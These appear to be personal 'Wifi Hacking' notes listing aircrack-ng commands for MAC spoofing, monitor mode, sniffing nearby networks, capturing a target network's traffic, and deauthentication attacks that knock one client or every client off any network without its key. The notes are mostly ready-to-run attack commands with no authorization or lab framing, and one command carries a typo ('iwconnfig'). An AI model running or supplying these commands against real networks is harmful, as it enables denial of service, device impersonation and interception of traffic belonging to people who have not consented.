Wifi Hacking 

//Wireless adapter reuirements
==> Monitor mode
==> Packet Injection
==> AP Mode (Access point)

//Recommennded Chipset 
==> Realtek RTL8812AU
==> Atheros AR9271 

//Change MAC address 
==> Increase Anonymity
==> Impersonate other devices
==> Bypass filters

**CMD
ifconfig (Choose interface like ==> wlan0)
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up

get back original MAC address(Restart system/Re-attached the wifi adpater) 

//Managed || Monitor mode (Promicious mode OR shealth mode)
**CMD
iwconfig (Check interface mode)
ifconfig wlan0 down
airmon-ng check kill
iwconnfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig (check interface mode)


//Packet sniffing using airodump-ng
discover all wireless network devices around you and show there BSSID, ESSID, ENC, CIPHER, AUTH etc.
 
airodump-ng wlan0 (interface name)   

//WIFI Bands
==>Decides the frequency range that can be used.
==>Determines the channels that can be used.
==>Clients need to support band used by router to communicate with it.
==>Data can be sniffed from a certain band if the wireless adapter used supports that band.

==>Most common WiFi Bands are:
       ** a uses 5 Ghz frequency only.
       ** b, g both use 2.4 Ghz frequency only.
       ** n uses 5 and 2.4 Ghz.
       ** ac uses frequencies lower than 6 Ghz

**CMD
airodump-ng --band a|b|g|n|ac wlan0mon (interface name)

**Target packet sniffing
airodump-ng --bssid <MAC> --channel <1> --write test wlan0(interface name)

//De-authentication Attack  using aireplay-ng

==>Disconnect  any client from any network
	** Works on encrypted networks (WEP, WPA, WPA2)
	** no need to know network key
	** no need to connect to the network

	^^ Deauth. specific client on that network
	=> aireplay-ng --deauth 100000{#Deauthpackets} -a {Network mac}  -c {Target mac}  {Inter face} -D
        	** If client target using 5 ghz frequency use '-D' flag 
	
	^^ Deauth. all client on that network
	=> aireplay-ng --deauth 100000{#Deauthpackets} -a {Network mac}  {Inter face} -D
		** If client target using 5 ghz frequency use '-D' flag
